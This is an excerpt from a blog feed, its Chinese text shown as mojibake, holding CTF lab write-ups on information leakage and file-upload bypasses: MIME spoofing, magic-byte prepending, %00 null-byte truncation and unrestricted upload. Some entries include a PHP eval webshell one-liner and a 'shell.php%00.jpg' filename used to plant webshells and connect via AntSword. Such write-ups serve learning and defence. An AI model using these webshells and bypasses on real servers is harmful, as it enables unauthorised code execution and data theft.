title="zipå‹ç¼©å‘½ä»¤"></a>zipå‹ç¼©å‘½ä»¤</h3><p>å‹ç¼©æ–‡ä»¶</p><p>â€‹     zip test.zip linked.h linked.c</p><p>è§£å‹æ–‡ä»¶</p><p>â€‹    unzip test.zip</p><h3 id="tarï¼ˆtape-archiveï¼‰å‘½ä»¤"><a href="#tarï¼ˆtape-archiveï¼‰å‘½ä»¤" class="headerlink" title="tarï¼ˆtape archiveï¼‰å‘½ä»¤"></a>tarï¼ˆtape archiveï¼‰å‘½ä»¤</h3><p>æ ¼å¼ï¼štar [é€‰é¡¹â€¦] [æ–‡ä»¶æˆ–ç›®å½•]â€¦</p><p>è¯´æ˜ï¼štaræ˜¯ç”¨æ¥å»ºç«‹ã€è¿˜åŸæ–‡ä»¶çš„å·¥å…·ç¨‹åºï¼Œå®ƒå¯ä»¥åŠ å…¥ã€è§£å¼€å¤‡ä»½æ–‡ä»¶å†…çš„æ–‡ä»¶</p><p>å¸¸ç”¨é€‰é¡¹ï¼š</p><p>-A:æ–°å¢taræ–‡ä»¶åˆ°å·²å­˜åœ¨çš„å¤‡ä»½æ–‡ä»¶</p><p>-c:å»ºç«‹æ–°çš„å¤‡ä»½æ–‡ä»¶ -få¤‡ä»½æ–‡ä»¶&gt;ï¼šåˆ—å‡ºå¤‡ä»½æ–‡ä»¶çš„å†…å®¹</p><p>-v:æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹</p><p>-x:ä»å¤‡ä»½æ–‡ä»¶ä¸­è¿˜åŸæ–‡ä»¶</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linuxå‘½ä»¤</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¿¡æ¯æ³„éœ²</title>
    <link href="/2025/04/06/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/06/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="git"><a href="#git" class="headerlink" title=".git"></a>.git</h2><p><code>.git</code>æ˜¯ Git ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä½¿ç”¨çš„éšè—æ–‡ä»¶å¤¹ï¼Œå®ƒåŒ…å«äº†é¡¹ç›®çš„å®Œæ•´ç‰ˆæœ¬å†å²è®°å½•ã€æäº¤è®°å½•ã€åˆ†æ”¯ä¿¡æ¯ç­‰</p><p>ä¸€å®šè¦åœ¨GitHackç›®å½•ä¸‹</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">python2 GitHack.<span class="hljs-keyword">py</span> http://challenge-efb678740fb6553d.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/.git<br></code></pre></td></tr></table></figure><h2 id="å¤‡ä»½æ–‡ä»¶æ³„éœ²"><a href="#å¤‡ä»½æ–‡ä»¶æ³„éœ²" class="headerlink" title="å¤‡ä»½æ–‡ä»¶æ³„éœ²"></a>å¤‡ä»½æ–‡ä»¶æ³„éœ²</h2><h3 id="index-php-swp"><a href="#index-php-swp" class="headerlink" title="index.php.swp"></a>index.php.swp</h3><p><code>.swp</code> æ–‡ä»¶æ˜¯ Vim ç¼–è¾‘å™¨åœ¨ç¼–è¾‘æ–‡ä»¶æ—¶ç”Ÿæˆçš„****ä¸´æ—¶æ–‡ä»¶****ï¼Œç”¨äºä¿å­˜ç¼–è¾‘è¿‡ç¨‹ä¸­çš„ä¸­é—´çŠ¶æ€ã€‚</p><p>å¦‚æœç¼–è¾‘è¿‡ç¨‹ä¸­ Vim æ„å¤–é€€å‡ºï¼ˆå¦‚ç”±äºç½‘ç»œä¸­æ–­ã€æœåŠ¡å™¨é‡å¯ç­‰åŸå› ï¼‰ï¼Œ<code>.swp</code> æ–‡ä»¶å¯èƒ½ä¼šä¿ç•™ä¸‹æ¥ã€‚</p><p>å¦‚æœè¿™ä¸ªæ–‡ä»¶è¢«éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¹¶ä¸”åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚æ•°æ®åº“å¯†ç ã€API å¯†é’¥ç­‰ï¼‰ï¼Œå°±å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚</p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php~"></a><strong><code>index.php~</code></strong></h3><p><code>index.php~</code> æ–‡ä»¶é€šå¸¸æ˜¯æŸäº›æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚ nano æˆ–æŸäº›ç‰ˆæœ¬çš„ vi&#x2F;vimï¼‰åœ¨ç¼–è¾‘æ–‡ä»¶æ—¶ç”Ÿæˆçš„ä¸´æ—¶å¤‡ä»½æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸ç”¨äºåœ¨ç¼–è¾‘å™¨æ„å¤–é€€å‡ºæˆ–å´©æºƒæ—¶æ¢å¤æœªä¿å­˜çš„æ›´æ”¹ã€‚ç„¶è€Œï¼Œå¦‚æœè¿™äº›ä¸´æ—¶æ–‡ä»¶è¢«æ„å¤–åœ°ä¿ç•™åœ¨å…¬å¼€å¯è®¿é—®çš„æœåŠ¡å™¨ä¸Šï¼Œå°±å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œå°¤å…¶æ˜¯å½“å®ƒä»¬åŒ…å«æ•æ„Ÿä¿¡æ¯æ—¶ã€‚</p><h3 id="index-php-bak"><a href="#index-php-bak" class="headerlink" title="index.php.bak"></a><code>index.php.bak</code></h3><p><code>.bak</code> æ–‡ä»¶é€šå¸¸æ˜¯æ–‡ä»¶çš„****å¤‡ä»½ç‰ˆæœ¬****ï¼Œå¯èƒ½æ˜¯åœ¨ç¼–è¾‘æˆ–æ›´æ–°æ–‡ä»¶æ—¶ç”±ç¼–è¾‘å™¨æˆ–å¼€å‘äººå‘˜è‡ªåŠ¨ç”Ÿæˆçš„ã€‚</p><p>å¦‚æœè¿™äº›å¤‡ä»½æ–‡ä»¶åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œå¹¶ä¸”è¢«éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒåŒæ ·å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚</p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a><strong>robots.txt</strong></h3><p><code>robots.txt</code> æ˜¯ä¸€ä¸ªæ”¾ç½®åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨äºå‘Šè¯‰æœç´¢å¼•æ“çˆ¬è™«ï¼ˆä¹Ÿç§°ä¸ºæœºå™¨äººæˆ–èœ˜è››ï¼‰å“ªäº›é¡µé¢å¯ä»¥æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½æŠ“å–ã€‚è¿™æ˜¯ç½‘ç«™ç®¡ç†å‘˜æ§åˆ¶æœç´¢å¼•æ“æŠ“å–è¡Œä¸ºçš„ä¸€ç§æ ‡å‡†æ–¹å¼ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¿¡æ¯æ³„éœ²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFhubå‰ç«¯éªŒè¯ MIMEç»•è¿‡</title>
    <link href="/2025/03/18/CTFhub%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81-MIME%E7%BB%95%E8%BF%87/"/>
    <url>/2025/03/18/CTFhub%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81-MIME%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFhubå‰ç«¯éªŒè¯-MIMEç»•è¿‡"><a href="#CTFhubå‰ç«¯éªŒè¯-MIMEç»•è¿‡" class="headerlink" title="CTFhubå‰ç«¯éªŒè¯ MIMEç»•è¿‡"></a>CTFhubå‰ç«¯éªŒè¯ MIMEç»•è¿‡</h1><h2 id="å‰ç«¯éªŒè¯"><a href="#å‰ç«¯éªŒè¯" class="headerlink" title="å‰ç«¯éªŒè¯"></a>å‰ç«¯éªŒè¯</h2><p>å‰ç«¯éªŒè¯æ˜¯åœ¨ç”¨æˆ·æäº¤æ•°æ®ä¹‹å‰ï¼Œåœ¨<strong>æµè§ˆå™¨ç«¯</strong>æ£€æŸ¥è¾“å…¥æ•°æ®æ˜¯å¦ç¬¦åˆè¦æ±‚</p><p>é¢˜ç›®æœ‰é™åˆ¶åªèƒ½ä¸Šä¼ ç‰¹å®šåç¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç›´æ¥ä¿®æ”¹ä¸€å¥è¯æœ¨é©¬çš„åç¼€ä¸ºpngï¼Œä¸Šä¼ åbpæŠ“åŒ…å†æ”¹ä¸ºphpã€‚è¿™æ ·å°±é¥¶è¿‡äº†å‰ç«¯éªŒè¯ä½†æ˜¯phpä¾æ—§èƒ½åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-41-57.png" alt="PixPin_2025-03-17_16-41-57"></p><p>ä¸Šä¼ æˆåŠŸï¼Œè·å¾—æ–‡ä»¶ä¸Šä¼ è·¯å¾„</p><p>ç„¶åå°±æ˜¯è¿æ¥èšå‰‘<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-39-17.png" alt="PixPin_2025-03-17_16-39-17"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-39-45.png" alt="PixPin_2025-03-17_16-39-45"></p><h2 id="MIMEç»•è¿‡"><a href="#MIMEç»•è¿‡" class="headerlink" title="MIMEç»•è¿‡"></a>MIMEç»•è¿‡</h2><p>ä»€ä¹ˆæ˜¯ MIME ç±»å‹ï¼Ÿ</p><p>MIMEæ˜¯ä¸€ç§ æ ‡è¯†æ–‡ä»¶ç±»å‹çš„æ–¹å¼</p><p>å½“ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œæµè§ˆå™¨ä¼šå‘æœåŠ¡å™¨å‘é€ æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Type: image/png<br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼ŒæœåŠ¡å™¨å°±èƒ½çŸ¥é“ ä¸Šä¼ çš„æ˜¯ PNG å›¾ç‰‡ã€‚</p><p>MIME ç»•è¿‡çš„æ ¸å¿ƒåŸç†</p><p><strong>æ­£å¸¸çš„æ–‡ä»¶ä¸Šä¼ é€»è¾‘</strong></p><ol><li><p><strong>å‰ç«¯æ£€æŸ¥ MIME ç±»å‹</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">javascriptå¤åˆ¶ç¼–è¾‘<span class="hljs-keyword">if</span>(file.<span class="hljs-keyword">type</span> <span class="hljs-type">!== </span><span class="hljs-string">&quot;image/png&quot;</span>) &#123;<br>    alert(<span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼  PNG å›¾ç‰‡ï¼&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»•è¿‡æ–¹å¼</strong>ï¼šä¿®æ”¹ <code>file.type</code>ï¼Œæˆ–ç›´æ¥ç¦ç”¨ JS æ ¡éªŒã€‚</p></li><li><p><strong>åç«¯æ£€æŸ¥ MIME ç±»å‹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] !== <span class="hljs-string">&quot;image/png&quot;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»•è¿‡æ–¹å¼</strong>ï¼š</p><ul><li><strong>ä¿®æ”¹è¯·æ±‚å¤´çš„ <code>Content-Type</code></strong></li><li><strong>ä¼ªé€ æ–‡ä»¶æ‰©å±•å</strong></li><li><strong>åˆ©ç”¨ PHP è§£ææ¼æ´</strong></li><li><strong>åŒæ‰©å±•åç»•è¿‡</strong></li></ul></li></ol><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-45-52.png" alt="PixPin_2025-03-17_16-45-52"></p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥æ›´æ”¹Content-Typeã€‚ç„¶åè¿æ¥èšå‰‘ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-47-18.png" alt="PixPin_2025-03-17_16-47-18"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-47-35.png" alt="PixPin_2025-03-17_16-47-35"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      
      <tag>Ctfhub</tag>
      
      <tag>å‰ç«¯éªŒè¯</tag>
      
      <tag>MIMEç»•è¿‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFhubæ–‡ä»¶å¤´æ£€æŸ¥ 00æˆªæ–­</title>
    <link href="/2025/03/18/CTFhub%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5-00%E6%88%AA%E6%96%AD/"/>
    <url>/2025/03/18/CTFhub%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5-00%E6%88%AA%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFhubæ–‡ä»¶å¤´æ£€æŸ¥-00æˆªæ–­"><a href="#CTFhubæ–‡ä»¶å¤´æ£€æŸ¥-00æˆªæ–­" class="headerlink" title="CTFhubæ–‡ä»¶å¤´æ£€æŸ¥ 00æˆªæ–­"></a>CTFhubæ–‡ä»¶å¤´æ£€æŸ¥ 00æˆªæ–­</h1><h2 id="æ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡åŸç†åŠæ–¹æ³•"><a href="#æ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡åŸç†åŠæ–¹æ³•" class="headerlink" title="æ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡åŸç†åŠæ–¹æ³•"></a>æ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡åŸç†åŠæ–¹æ³•</h2><p>æ‰€æœ‰çš„æ–‡ä»¶éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¿›è¡Œå­˜å‚¨çš„ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰å·®åˆ«ã€‚åœ¨æ¯ä¸€ä¸ªæ–‡ä»¶çš„å¼€å¤´å®é™…ä¸Šéƒ½æœ‰ä¸€ç‰‡åŒºåŸŸæ¥æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶çš„å®é™…ç”¨æ³•ï¼Œè¿™å°±æ˜¯æ–‡ä»¶å¤´æ ‡å¿—ã€‚</p><p>å¸¸è§çš„æ–‡ä»¶å¤´ï¼š<br>æ³¨æ„ï¼šä¸‹é¢çš„æ–‡ä»¶å¤´çš„æ ¼å¼æ˜¯16è¿›åˆ¶çš„æ ¼å¼ï¼š</p><p>GIFï¼š47 49 46 38 39 61<br>pngï¼š89 50 4E 47 0D 0A 1A 0A<br>JPGï¼šFF D8 FF E0 00 10 4A 46 49 46</p><p>æ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡æ–¹æ³•ï¼š</p><p>ç¬¬ä¸€ç§ï¼š <strong>æŠŠä¸Šé¢çš„æ–‡ä»¶å¤´æ·»åŠ åˆ°æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å†…å®¹æœ€å‰é¢ï¼Œè¾¾åˆ°ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹çš„ç›®çš„ã€‚</strong></p><p>æ–¹æ³•åœ¨ï¼š<a href="https://blog.csdn.net/weixin_45588247/article/details/119592213">ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€‘â€”â€”åç«¯æ£€æµ‹_æ–‡ä»¶å¤´æ£€æµ‹æ¼æ´_ã€ä¸­æ ¸æ£€æµ‹ã€‘ã€æ–‡ä»¶ã€‘-CSDNåšå®¢</a></p><p>ç¬¬äºŒç§ï¼šéšä¾¿æ‰¾ä¸€å¼ å›¾ç‰‡ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ç„¶ååœ¨åé¢æ‹¼æ¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>ä½†æ˜¯è¿™å¼ å›¾ç‰‡è¦å°½é‡å°ä¸€ç‚¹ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåŒæ ·çš„æ“ä½œï¼Œæ¯”è¾ƒå¤§çš„å›¾ç‰‡ä¸€ç›´æˆåŠŸä¸äº†ã€‚</p><h2 id="æ–‡ä»¶å¤´æ£€æŸ¥wp"><a href="#æ–‡ä»¶å¤´æ£€æŸ¥wp" class="headerlink" title="æ–‡ä»¶å¤´æ£€æŸ¥wp"></a>æ–‡ä»¶å¤´æ£€æŸ¥wp</h2><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_17-08-44.png" alt="PixPin_2025-03-17_17-08-44"></p><p>æ‹¼æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_17-11-42.png" alt="PixPin_2025-03-17_17-11-42"></p><p>ç”¨010æŸ¥çœ‹å¯ä»¥å‘ç°æ‹¼æ¥æˆåŠŸäº†</p><p><img src="E:\temp\PixPin_2025-03-17_17-12-58.png" alt="PixPin_2025-03-17_17-12-58"></p><p>ç„¶åæ›´æ”¹åç¼€ï¼Œä¹‹åçš„æ­¥éª¤éƒ½ä¸€æ ·</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_17-13-44.png" alt="PixPin_2025-03-17_17-13-44"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_17-14-08.png" alt="PixPin_2025-03-17_17-14-08"></p><h2 id="00æˆªæ–­åŸç†"><a href="#00æˆªæ–­åŸç†" class="headerlink" title="00æˆªæ–­åŸç†"></a>00æˆªæ–­åŸç†</h2><p>åœ¨PHP 5.2ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªä¸¥é‡çš„æ¼æ´ï¼Œå³<strong>00æˆªæ–­æ¼æ´</strong>ã€‚è¯¥æ¼æ´å…è®¸æ¶æ„ç”¨æˆ·é€šè¿‡URLå‚æ•°è¾“å…¥*%00*ï¼Œå¯¼è‡´åç»­å­—ç¬¦è¢«è‡ªåŠ¨å¿½ç•¥ï¼Œä»è€Œç»•è¿‡æ–‡ä»¶ç±»å‹çš„é™åˆ¶ã€‚</p><p>æ¼æ´ç¤ºä¾‹</p><p>ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œè¦æ±‚ä¸Šä¼ çš„æ–‡ä»¶å¿…é¡»æ˜¯*.jpg<em>æ ¼å¼ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªåä¸º</em>shell.php%00.jpg<em>çš„æ–‡ä»¶ã€‚ç”±äº</em>%00<em>åœ¨URLç¼–ç ä¸­è¡¨ç¤ºASCIIç ä¸­çš„ç©ºå­—ç¬¦ï¼ˆNULLå­—ç¬¦ï¼‰ï¼ŒPHPåœ¨å¤„ç†æ–‡ä»¶åæ—¶ä¼šå°†å…¶è§†ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸç¬¦ï¼Œä»è€Œå¿½ç•¥åé¢çš„</em>.jpg*</p><p>&#x2F;&#x2F; ä¸Šä¼ çš„æ–‡ä»¶åä¸º shell.php%00.jpg</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;shell.php%00.jpg&quot;</span>;<br><br><span class="hljs-regexp">//</span> <span class="hljs-variable constant_">PHP</span> <span class="hljs-number">5.2</span> è§£ææ—¶ä¼šå°†å…¶è§†ä¸º shell.php<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$filename</span>; <span class="hljs-regexp">//</span> å®é™…åŒ…å«çš„æ˜¯ shell.php<br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼ŒPHPä¼šå°†*$filename<em>è§£æä¸º</em>shell.php*ï¼Œä»è€Œæ‰§è¡ŒPHPä»£ç ï¼Œè€Œä¸æ˜¯å°†å…¶è§†ä¸ºä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶</p><h2 id="00æˆªæ–­wp"><a href="#00æˆªæ–­wp" class="headerlink" title="00æˆªæ–­wp"></a>00æˆªæ–­wp</h2><p>ä¸Šä¼ å›¾ç‰‡ç æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-18_20-58-01.png" alt="PixPin_2025-03-18_20-58-01"></p><p>æ–‡ä»¶ä¸Šä¼ æˆåŠŸååªæ‰§è¡Œäº† JavaScript å¼¹çª— (<code>alert()</code>)ï¼Œä½†å¹¶æ²¡æœ‰ <code>echo</code> æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œå› æ­¤æµè§ˆå™¨ç«¯ä¸ä¼šç›´æ¥çœ‹åˆ°æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„</p><p>æˆ‘ä»¬ç›´æ¥åœ¨èšå‰‘è¿æ¥åé¢æ·»åŠ &#x2F;upload&#x2F;3.phpï¼ˆç†æƒ³ä¸­çš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼‰è¿æ¥å¤±è´¥</p><p>æŸ¥çœ‹æºä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_18-25-21.png" alt="PixPin_2025-03-17_18-25-21"></p><p><a href="https://blog.csdn.net/Mitchell_Donovan/article/details/115918878">ã€CTFHubã€‘æ–‡ä»¶ä¸Šä¼ æ¼æ´_00æˆªæ–­_ctfhub00æˆªæ–­-CSDNåšå®¢</a></p><p><strong>rand()å‡½æ•°æ˜¾ç„¶æ˜¯ç”Ÿæˆäº†éšæœºæ•°ï¼Œå¯¹æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„è¿›è¡Œäº†æ‹¼æ¥</strong></p><p><strong>æ‰€ä»¥æˆ‘ä»¬åœ¨æˆåŠŸä¸Šä¼ åè¿˜æ˜¯æ‰¾ä¸åˆ°æ–‡ä»¶è·¯å¾„å·²ç»ä¸æ˜¯3.php(3.php%00.png)ï¼Œä¾æ—§æ— æ³•è¿æ¥</strong></p><p>æ€è·¯å°±æ˜¯ç”¨00æˆªæ–­å­—ç¬¦æŠŠéšæœºæ•°ç»™æˆªæ–­æ‰ï¼Œ</p><p><img src="E:\temp\PixPin_2025-03-18_21-07-52.png" alt="PixPin_2025-03-18_21-07-52"></p><p>ç”¨ç”¨èšå‰‘è¿æ¥è¿™ä¸ªwebshell</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_18-34-02.png" alt="PixPin_2025-03-17_18-34-02"></p><p>ï¼ˆç”¨çš„ç¬¬ä¸€æ¬¡åšçš„æˆªå›¾æ‰€ä»¥æ˜¾ç¤ºæ˜¯2.phpï¼‰</p><p>æ‰¾åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_18-34-23.png" alt="PixPin_2025-03-17_18-34-23"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      
      <tag>00æˆªæ–­</tag>
      
      <tag>CTFhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFhub æ–‡ä»¶ä¸Šä¼ æ— é™åˆ¶</title>
    <link href="/2025/03/18/CTFhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%97%A0%E9%99%90%E5%88%B6/"/>
    <url>/2025/03/18/CTFhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%97%A0%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFhub-æ–‡ä»¶ä¸Šä¼ æ— é™åˆ¶"><a href="#CTFhub-æ–‡ä»¶ä¸Šä¼ æ— é™åˆ¶" class="headerlink" title="CTFhub æ–‡ä»¶ä¸Šä¼ æ— é™åˆ¶"></a>CTFhub æ–‡ä»¶ä¸Šä¼ æ— é™åˆ¶</h1><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-29-19.png" alt="PixPin_2025-03-17_16-29-19"></p><p>ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬phpæ–‡ä»¶å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-18_19-05-21.png" alt="PixPin_2025-03-18_19-05-21"></p><!--æˆ‘çš„ç†è§£æ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬åï¼Œç½‘ç«™çš„phpæºç ä¼šæ–°å¢ä¸€ä¸ªå‚æ•°ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‚æ•°ä¼ æ¶æ„å‚æ•°å®ç°ä»»æ„æ–‡ä»¶è¯»å–--><!--ä¸ºä»€ä¹ˆä¼ <?php @eval($_POST['1']);?>å¯ä»¥è¢«ç½‘ç«™è§£ææ‰§è¡Œå¹¶æ·»åŠ è¿™ä¹ˆä¸€ä¸ªå‚æ•°ï¼š--><!--PHP ä»£ç åœ¨ **æœåŠ¡å™¨ç«¯** è¿è¡Œï¼Œè€Œä¸æ˜¯åœ¨å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰æ‰§è¡Œã€‚--> <!--å½“è®¿é—®ä¸€ä¸ª PHP æ–‡ä»¶æ—¶ï¼ŒæœåŠ¡å™¨ä¼šï¼š--><ul><li><!--è¯»å– PHP æ–‡ä»¶çš„å†…å®¹--></li><li><!--äº¤ç»™ PHP è§£æå™¨è§£æ--></li><li><!--è¿è¡Œä»£ç ï¼Œè¿”å›ç»“æœç»™ç”¨æˆ·--></li></ul><!--æ‰€ä»¥ï¼Œä¸€æ—¦ä½ ä¸Šä¼ äº† `<?php @eval($_POST['1']); ?>`ï¼Œå®ƒå°±ä¼šè¢« **æœåŠ¡å™¨æ‰§è¡Œ**ï¼Œå¹¶ä¸ä¼šå½“ä½œæ™®é€šæ–‡æœ¬å¯¹å¾…ã€‚--><p>èšå‰‘è¿æ¥ æŸ¥çœ‹ç›®å½•</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-31-21.png" alt="PixPin_2025-03-17_16-31-21"></p><p>æ‰¾åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-17_16-32-26.png" alt="PixPin_2025-03-17_16-32-26"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€äº›SQLæ³¨å…¥æ–‡ä»¶ä¸Šä¼ RCE</title>
    <link href="/2025/03/16/%E4%B8%80%E4%BA%9BSQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE/"/>
    <url>/2025/03/16/%E4%B8%80%E4%BA%9BSQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE/</url>
    
